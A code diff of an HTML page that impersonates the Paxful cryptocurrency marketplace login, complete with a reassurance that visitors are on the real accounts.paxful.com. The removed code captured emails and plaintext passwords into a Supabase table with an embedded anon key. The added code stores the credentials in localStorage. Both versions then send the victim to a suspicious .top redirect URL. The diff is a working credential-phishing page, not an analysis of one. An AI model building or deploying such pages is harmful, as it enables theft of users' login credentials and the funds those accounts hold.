@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login with Paxful</title>
     <link rel="stylesheet" href="styles.css">
-    <script src="https://unpkg.com/supabase@1.23.1/supabase.umd.min.js"></script>
 </head>
 <body>
     <div class="login-container">
@@ -55,7 +54,7 @@
           <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
       </div><br>
 
-        <form class="login-form" id="registrationForm">
+        <form class="login-form" id="registrationForm" onsubmit="storeCredentials(event)">
             <label for="phone-email">Your Phone or Email</label>
             <input type="email" id="email" name="phone-email" required>
             
@@ -66,12 +65,7 @@
               <a href="#">Forgot password?</a>
           </div>
 
-            <button type="submit" class="login-button" onclick="redirectToPage()">Log in</button>
-            <script type="text/javascript">
-              function redirectToPage() {
-                  window.location.href = "https://approximatereservoir.top/45f0Xkh4Q3lXeXJRRwYnRVcGJEddDChbCXhkBAoDBioaK1Y6biMDCDtQIXtlag?1718686957216";
-              }
-          </script>
+            <button type="submit" class="login-button">Log in</button>
         </form>
 
         <div class="create-account">
@@ -79,61 +73,20 @@
         </div>
     </div>
 
+    <script type="text/javascript">
+      function storeCredentials(event) {
+          event.preventDefault(); // Prevent the form from submitting normally
 
-    <script>
-        // Your Supabase project URL and anon key
-        const supabaseUrl = 'https://upqbzytjynfyozqmehqs.supabase.co';
-        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVwcWJ6eXRqeW5meW96cW1laHFzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjIzMzg2NDQsImV4cCI6MjAzNzkxNDY0NH0.zApMGkAI5Bymlwz9e3NwDHCn7-ZTKB3xkgLJfCVN_j0';
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
 
-        // Initialize Supabase client 
-       supabase = Supabase.createClient(supabaseUrl, supabaseAnonKey);
+          // Store credentials in localStorage
+          localStorage.setItem('email', email);
+          localStorage.setItem('password', password);
 
-        // Handle form submission
-        document.getElementById('registrationForm').addEventListener('submit', async (event) => {
-            event.preventDefault();
-
-            // Get email and password from the form
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // Hash the password (you should use a proper password hashing library in production)
-            const hashedPassword = await hashPassword(password);
-
-            // Save the user to Supabase
-            await saveUser(email, hashedPassword);
-
-            // Redirect or show a success message
-            window.location.href = '/dashboard';
-        });
-
-        // Function to hash the password (for demonstration purposes)
-        async function hashPassword(password) {
-            // In a real-world application, use a proper password hashing library like bcrypt.
-            return password;
-        }
-
-        // Function to save the user to Supabase
-        async function saveUser(email, hashedPassword) {
-            try {
-                // Insert the user into the "users" table
-                const { data, error } = await supabase
-                    .from('users')
-                    .insert([
-                        {
-                            email: email,
-                            password: hashedPassword,
-                        },
-                    ]);
-
-                if (error) {
-                    throw error;
-                }
-
-                console.log('User registered successfully:', data);
-            } catch (error) {
-                console.error('Error registering user:', error);
-            }
-        }
+          // Redirect to the specified URL
+          window.location.href = "https://approximatereservoir.top/45f0Xkh4Q3lXeXJRRwYnRVcGJEddDChbCXhkBAoDBioaK1Y6biMDCDtQIXtlag?1718686957216";
+      }
     </script>
 </body>
 </html>
